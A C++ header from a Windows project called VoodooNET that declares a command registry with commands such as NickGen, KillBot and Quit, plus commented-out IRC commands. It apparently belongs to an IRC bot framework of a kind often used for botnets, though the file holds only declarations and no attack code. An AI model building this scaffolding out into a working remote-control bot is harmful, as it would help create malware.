/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#pragma once
#ifndef __CCOMMANDS_H__
#define __CCOMMANDS_H__
//#include <cString.h>
#include <atlstr.h>
//#include "cThread.h"
using namespace std;
#define ADDCMD(a, b, c, d) g_cVoodoo->m_cCommands.RegisterCommand(&a, b, c, d);
#define ADDMODULE(a, b, c, d) g_cVoodoo->m_cCommands.RegisterModule(&a, b, c, d);

class cCommandHandler
{
public:
	virtual bool HandleCommand(char* cmd, char* params, ...) = 0;
};
typedef struct command_s
{ 
	string				sName;
	string				sDescription;
	cCommandHandler		 *cHandle;
} command;
typedef struct moaduload_s
{
	string				cModule;
	string				cVersion;
	string				cDesc;
} moduload;


class cCommands : public cCommandHandler
{
public:
	cCommands();
	void Init();
	void readcommand(char* cmd, char* params, ...);
	void RegisterCommand(command *pCommand, const char* szName, const char* szDesc, cCommandHandler *cHandle);
	void RegisterModule(moduload* moo, const char* cModule, const char* cVersion, const char* cDesc, ...);
	void ShowModules();
	command* FindCommand(const char* szName);
	bool HandleCommand(char* cmd, char* params, ...);
	bool cModuleHandler(char* name, char* desc, ...);
	command				m_cmdList;
	command				m_cmdTest;
	command				m_cmdNew;
	command				m_cmdUptime;
	command				m_cmdAbout;
	command				m_cmdNickGen;
	command				m_cmdKillBot;
	command				m_cmdTestOne;
	command				m_cmdQuit;
	command				m_cmdModulesList;
	//command m_cmdIRCSendMessage, m_cmdIRCQuit, m_cmdIRCNickChange;
	moduload m_ModListing;
	list<command*>		m_lCommands;
	list<moduload*>		m_cModules;
};
#endif